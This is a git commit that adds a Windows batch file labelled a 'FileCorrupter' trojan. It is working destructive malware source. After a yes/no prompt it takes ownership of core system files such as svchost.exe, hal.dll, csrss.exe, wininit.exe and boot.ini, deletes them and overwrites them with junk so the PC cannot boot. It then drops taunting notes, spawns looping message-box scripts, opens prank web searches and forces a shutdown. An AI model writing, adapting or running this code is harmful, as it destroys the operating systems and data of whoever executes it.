6f5fdb4cb58a65ff92b9e7795aa0a26400a5052d
adoomyxx <144142418+adoomyxx@users.noreply.github.com>
2023-11-11 11:09:04 +0400

    Trojan:Win32/FileCorrupter
    Trojan:Win32/FileCorrupter

---
+++ Formula.bat
@@ -0,0 +1,87 @@
+@echo off
+:1
+echo Hello. This malware will harm your computer and will make it unusable, This Malware can Corrupt System files, Are you sure you wanna run this?
+echo yes/no
+set /p choice=
+if /i %choice%==yes goto run
+if /i %choice%==no goto exit
+if not /i %choice%==yes,no goto 1
+
+:run
+takeown /f C:\Windows\System32\svchost.exe
+del /f /q C:\Windows\System32\svchost.exe
+cd C:\Windows\System32
+echo BjMHtHRaNHbaGpPlOMnOaaR+AmAnLlAAAAAAAAAAAAA6AAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAA6AAAAAAAAAAAAAAAAAAAAAAAAAAAA>>svchost.exe
+takeown /f C:\boot.ini
+del /f /q C:\boot.ini
+cd C:\
+echo ;++-7-+hu-6+yyyhggyYGuuyg&-67-6g6-gUGyFgyCfy_5&"56u-u-&&6&_f_fytyytu7&yugg&67guh&yug&&&ygu&yug7yyg786&gu&uih&iuygiyu&yyi&i>>boot.ini
+takeown /f C:\Windows\System32\hal.dll
+del /f /q C:\Windows\System32\hal.dll
+cd C:\Windows\System32
+echo CzxNGaCDaFgaAAAeaMaOaLaZzSaRanKpLaiIaoKMrAMsSysReÆmNa>>hal.dll
+takeown /f C:\Windows\System32\wininit.exe
+del /f C:\Windows\System32\wininit.exe
+echo RagFGagzkHakGJahNhKGaiTNTNnGKag\GKGAaaY5MnajXcQ>>wininit.exe
+takeown /f C:\Windows\System32\csrss.exe
+del /f /q C:\Windows\System32\csrss.exe
+echo HbAlMakIuYraTlamKaoSysRæ3ß?+Baj>>csrss.exe
+cd %appdata%
+echo YOUR PC HAS BEEN DELETED BY THE Formula TROJAN, YOUR PC WILL NOT BOOT UP AGAIN :), TRYING TO RESTART WILL DESTROY YOUR PC IMMEDIATELY>>secretformula.txt
+start secretformula.txt
+echo.x=msgbox ("Still using this computer?",16,"lol")>>lol.vbs
+echo.do>>loop.vbs
+echo.x=msgbox ("Couldn't Click Me Away",48,"Windows Error")>>loop.vbs
+echo.loop>>loop.vbs
+echo @echo off>>qwerty.bat
+echo echo.do>>sam.vbs>>qwerty.bat
+echo echo.x=msgbox ("YOUR PC IS NOW MINE",2+32,"TROOLOL")>>sam.vbs>>qwerty.bat
+echo echo.loop>>sam.vbs>>qwerty.bat
+echo :loop>>qwerty.bat
+echo start sam.vbs>>qwerty.bat
+echo goto loop>>qwerty.bat
+echo alert("Hope you enjoy your pc LULZ");>>alert1234.js
+cd %USERPROFILE%
+timeout 5
+start www.google.co.ck/search?q=free+minecraft
+timeout 5
+start www.youtube.com/@adoomyxx
+echo heres my channel
+timeout 5
+start www.google.co.ck/search?q=how+2+get+money
+timeout 5
+start www.google.co.ck/search?q=virus+builder+legit+free+download
+timeout 5
+start www.google.co.ck/search?q=what+happens+if+you+delete+system32
+timeout 5
+start www.google.co.ck/search?q=how+2+buy+weed
+timeout 5
+start www.google.co.ck/search?q=help+me+my+pc+is+doing+weird+stuff+pls+halp
+timeout 5
+start www.play.clubpengiun.com
+start lol.vbs
+timeout 5
+start www.play.blooket.com
+start lol.vbs
+timeout 5
+start www.google.co.ck/search?q=is+illuminati+real
+start lol.vbs
+start loop.vbs
+timeout 5
+start www.google.co.ck/search?q=g3t+r3kt
+start loop.vbs
+start lol.vbs
+start lol.vbs
+start loop.vbs
+timeout 5
+start alert1234.js
+start www.google.co.ck/search?q=stanky+danky+maymays
+start lol.vbs
+start loop.vbs
+timeout 5
+start www.google.co.ck/search?q=how+2+delete+system32
+timeout 3
+shutdown /f /s /t 0 
+
+:exit
+exit
